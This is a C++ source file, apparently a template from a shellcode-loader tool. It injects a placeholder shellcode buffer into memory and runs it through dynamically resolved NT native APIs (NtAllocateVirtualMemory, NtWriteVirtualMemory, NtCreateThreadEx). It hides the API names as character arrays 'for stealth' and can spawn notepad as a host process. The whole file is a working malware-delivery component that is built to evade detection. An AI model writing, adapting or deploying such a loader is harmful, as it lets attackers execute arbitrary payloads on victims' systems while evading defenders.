/**
Author: Thomas X Meng
Classic native API, most detected by API Successions
***/
#include <windows.h>
#include <winternl.h>
#include <cstdio>

#pragma comment(lib, "ntdll.lib")

typedef DWORD(WINAPI *PFN_GETLASTERROR)();
typedef void (WINAPI *PFN_GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);


// typedef LONG NTSTATUS;
// #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

// Function typedefs for dynamically resolving NTDLL functions
typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG BufferSize,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *PFN_NtWaitForSingleObject)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

unsigned char magiccode[] = ####SHELLCODE####;

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize);

void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE_T magiccodeSize) {


    // Manual string definitions for stealth
    const char lib_ntdll[]         = { 'n','t','d','l','l','.','d','l','l',0 };
    const char str_NtAlloc[]       = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    const char str_NtWrite[]       = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
    const char str_NtCreate[]      = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
    const char str_NtWait[]        = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t',0 };

    // Resolve function addresses dynamically
    HMODULE hNtdll = GetModuleHandleA(lib_ntdll);
    if (!hNtdll) {
        printf("[-] Failed to get handle to NTDLL\n");
        return;
    }

    PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory =
        (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, str_NtAlloc);
    PFN_NtWriteVirtualMemory NtWriteVirtualMemory =
        (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, str_NtWrite);
    PFN_NtCreateThreadEx NtCreateThreadEx =
        (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, str_NtCreate);
    PFN_NtWaitForSingleObject NtWaitForSingleObject =
        (PFN_NtWaitForSingleObject)GetProcAddress(hNtdll, str_NtWait);

    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject) {
        printf("[-] Failed to resolve one or more NTDLL functions\n");
        return;
    }

    PVOID remoteBuffer = NULL;
    SIZE_T regionSize = magiccodeSize;

    // Allocate memory in remote process
    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &remoteBuffer,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtAllocateVirtualMemory failed (0x%X)\n", status);
        return;
    }

    // Write shellcode to remote memory
    status = NtWriteVirtualMemory(
        hProcess,
        remoteBuffer,
        (PVOID)magiccode,
        (ULONG)magiccodeSize,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtWriteVirtualMemory failed (0x%X)\n", status);
        return;
    }

    printf("[+] Shellcode written at address: %p\n", remoteBuffer);

    // Create remote thread in target process
    HANDLE hRemoteThread = NULL;
    status = NtCreateThreadEx(
        &hRemoteThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        remoteBuffer,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateThreadEx failed (0x%X)\n", status);
        return;
    }

    printf("[+] Remote thread created successfully\n");

    // Wait for remote thread to finish execution
    status = NtWaitForSingleObject(hRemoteThread, FALSE, NULL);
    if (NT_SUCCESS(status)) {
        printf("[+] Shellcode execution completed.\n");
    } else {
        printf("[-] NtWaitForSingleObject failed (0x%X)\n", status);
    }

    CloseHandle(hRemoteThread);

}

BOOL IsSystem64Bit() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) return FALSE;

    PFN_GETNATIVESYSTEMINFO pGetNativeSystemInfo = (PFN_GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
    if (!pGetNativeSystemInfo) {
        FreeLibrary(hKernel32);
        return FALSE;
    }

    BOOL bIsWow64 = FALSE;
    SYSTEM_INFO si = {0};
    pGetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 || si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64) {
        bIsWow64 = TRUE;
    }

    FreeLibrary(hKernel32);
    return bIsWow64;
}

int main(int argc, char *argv[])
{

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    //check if pid is provided as argument: 
    if (argc > 1) {
        pid = atoi(argv[1]);
        printf("[+] PID provided: %d\n", pid);
        // get pi information from pid:
        pi.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        pi.hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pid);
    } else {
        printf("[-] PID not provided\n");
        // Determine the correct Notepad path based on system architecture
        if (IsSystem64Bit()) {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
        } else {
            strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
        }

        // Attempt to create a process with Notepad
        BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
        if (!success) {
            MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
            return 1; // Exit if unable to start Notepad
        }
        printf("Notepad started with default settings.\n");
        pid = pi.dwProcessId;  
        printf("[+] notepad PID: %d\n", pid);      
    }

    //####END####

    SIZE_T magiccodeSize = sizeof(magiccode);

	printf("[+] Classic execution starts, all userland calls. \n");
    Injectmagiccode(GetCurrentProcess(), magiccode, magiccodeSize);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

	return 0;
}